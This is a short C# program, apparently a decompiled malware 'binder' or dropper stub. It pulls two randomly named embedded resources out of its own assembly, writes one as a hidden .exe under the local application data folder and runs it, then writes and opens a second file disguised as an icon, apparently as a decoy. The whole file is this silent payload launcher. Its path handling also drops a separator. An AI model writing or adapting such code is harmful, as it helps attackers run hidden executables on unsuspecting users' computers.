using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;

namespace Bound;

internal static class Open
{
	private static void Main()
	{
		try
		{
			ResourceManager resourceManager = new ResourceManager("files", Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "XaEIidGtwV.exe", (byte[])resourceManager.GetObject("KqSkGakBCB"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "XaEIidGtwV.exe");
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "LIPAUnNcWw..ico", (byte[])resourceManager.GetObject("nQzWIuAKGy"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "LIPAUnNcWw..ico");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
